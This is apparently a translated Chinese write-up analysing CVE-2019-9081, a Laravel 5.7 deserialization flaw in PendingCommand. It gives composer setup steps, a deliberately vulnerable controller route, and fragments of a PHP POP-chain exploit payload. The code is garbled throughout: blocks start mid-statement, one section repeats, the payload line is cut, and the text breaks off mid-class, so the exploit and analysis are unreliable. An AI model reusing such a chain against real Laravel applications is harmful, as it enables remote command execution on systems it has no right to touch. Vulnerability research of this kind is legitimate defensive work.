# CVE-2019-9081 Laravel反序列化浅析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 一、原理
###  （一）概述
Laravel是一个具有表现力强、语法优雅的web应用程序框架。按照框架作者的理念，开发必须是一种愉快和创造性的经历。因此，Laravel试图通过简化大多数web项目中使用的常见任务来使开发变得容易。
###  （二）CVE-2019-9081
相较于v5.6，laravel
v5.7版本中多了一个`PendingCommand.php`文件。[官方文档](https://laravel.com/api/8.x/Illuminate/Testing/PendingCommand.html)对于这个文件的class的大体讲解如下，
借用大佬的一句话，`__destruct()`方法是触发反序列化漏洞的最好方法。
查看`__destruct()`方法，其中调用了`run()`，
run的介绍如下，
即执行命令，这是一个可能的可利用点，还要对其进行观察分析，才能确认其是否真正可以利用。
我自己调试分析的过程记录在下，如有不足之处希望各位不吝赐教。
## 二、调试
###  （一）环境搭建
**1.基础环境**
[搭建参考链接](https://laravelacademy.org/post/9528.html)
首先，从PHPStudy上安装composer，
如有需要可配置国内镜像源，
    composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
然后通过 Composer 安装 Laravel 安装器：
    composer global require "laravel/installer"
安装指定版本的Laravel应用，比如5.7版本，可以使用这个命令：
    composer create-project --prefer-dist laravel/laravel blog 5.7.*
如此会在当前目录创建一个名为blob的新应用，将Phpstudy中的网站根目录设为blob/public，访问localhost，
见到此页面，
即说明搭建成功。
若在此过程中遇到`Fatal error: Allowed memory size of 1610612736 bytes exhausted (tried
to allocate 4096
bytes)`的错误，可参考[此链接](https://blog.csdn.net/wjcms/article/details/108932182)。
**2.情境设定**
情境设定如下：存在某一基于此框架的不安全的开发点`VulController`。
配置过程如下，在`routes/web.php`中添加一条路由记录，`Route::get('/vul',
'VulController[@index](https://github.com/index
"@index")');`，然后在`app/Http/Controllers`目录下新建文件`VulController.php`，源码如下:
    command = $command;
                $this->parameters = $parameters;
                $this->test=$class;
                $this->app=$app;
            }
        }
    }
    namespace Illuminate\Auth{
        class GenericUser{
            protected $attributes;
            public function __construct(array $attributes){
                $this->attributes = $attributes;
            }
        }
    }
    namespace Illuminate\Foundation{
        class Application{
            protected $hasBeenBootstrapped = false;
            protected $bindings;
            public function __construct($bind){
                $this->bindings=$bind;
            }
        }
    }
    ?>
exp
    array("0"=>"1"),"expectedQuestions"=>array("0"=>"1"))),new Illuminate\Foundation\Application(array("Illuminate\Contracts\Console\Kernel"=>array("concrete"=>"Illuminate\Foundation\Application"))))));
    ?>
exp
    command = $command;
                $this->parameters = $parameters;
                $this->test=$class;
                $this->app=$app;
            }
        }
    }
    namespace Illuminate\Auth{
        class GenericUser{
            protected $attributes;
            public function __construct(array $attributes){
                $this->attributes = $attributes;
            }
        }
    }
    namespace Illuminate\Foundation{
        class Application{